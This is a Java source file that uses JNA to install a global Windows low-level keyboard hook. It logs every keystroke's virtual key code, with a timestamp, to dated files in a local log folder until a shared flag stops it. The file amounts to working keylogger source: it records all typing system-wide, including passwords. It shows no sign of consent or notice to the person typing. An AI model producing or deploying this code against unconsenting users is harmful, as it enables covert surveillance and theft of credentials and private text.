package com.heyx.hook.process;

import com.sun.jna.Pointer;
import com.sun.jna.platform.win32.Kernel32;
import com.sun.jna.platform.win32.User32;
import com.sun.jna.platform.win32.WinDef;
import com.sun.jna.platform.win32.WinUser;

import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.Date;


public class KeyboardHook implements Runnable{

    private static WinUser.HHOOK hhk;
    private static WinUser.LowLevelKeyboardProc keyboardHook;
    final static User32 lib = User32.INSTANCE;
    private boolean [] on_off=null;

    public KeyboardHook(boolean [] on_off){
        this.on_off = on_off;
    }

    @Override
    public void run() {

        WinDef.HMODULE hMod = Kernel32.INSTANCE.GetModuleHandle(null);
        keyboardHook = new WinUser.LowLevelKeyboardProc() {
            public WinDef.LRESULT callback(int nCode, WinDef.WPARAM wParam, WinUser.KBDLLHOOKSTRUCT info) {
                SimpleDateFormat df1 = new SimpleDateFormat("yyyy-MM-dd");
                SimpleDateFormat df2 = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
                String fileName=df1.format(new Date());
                String time=df2.format(new Date());
                BufferedWriter bw1=null;
                BufferedWriter bw2=null;
                try {
                    bw1=new BufferedWriter(new FileWriter(new File(".//log//"+fileName+"_Keyboard.txt"),true));
                    bw2=new BufferedWriter(new FileWriter(new File(".//log//"+fileName+"_Common.txt"),true));

                } catch (IOException e) {
                    e.printStackTrace();
                }
                if (on_off[0] == false) {
                    System.exit(0);
                }
                try {
                    bw1.write(time+"  ####  "+info.vkCode+"\r\n");
                    bw2.write(time+"  ####  "+info.vkCode+"\r\n");
                    bw1.flush();
                    bw2.flush();
                } catch (IOException e) {
                    e.printStackTrace();
                }
                Pointer ptr = info.getPointer();
                long peer = Pointer.nativeValue(ptr);
                return lib.CallNextHookEx(hhk, nCode, wParam, new WinDef.LPARAM(peer));
            }
        };
        hhk = lib.SetWindowsHookEx(User32.WH_KEYBOARD_LL, keyboardHook, hMod, 0);
        int result;
        WinUser.MSG msg = new WinUser.MSG();
        while ((result = lib.GetMessage(msg, null, 0, 0)) != 0) {
            if (result == -1) {
                System.err.println("error in get message");
                break;
            } else {
                System.err.println("got message");
                lib.TranslateMessage(msg);
                lib.DispatchMessage(msg);
            }
        }
        lib.UnhookWindowsHookEx(hhk);
    }

}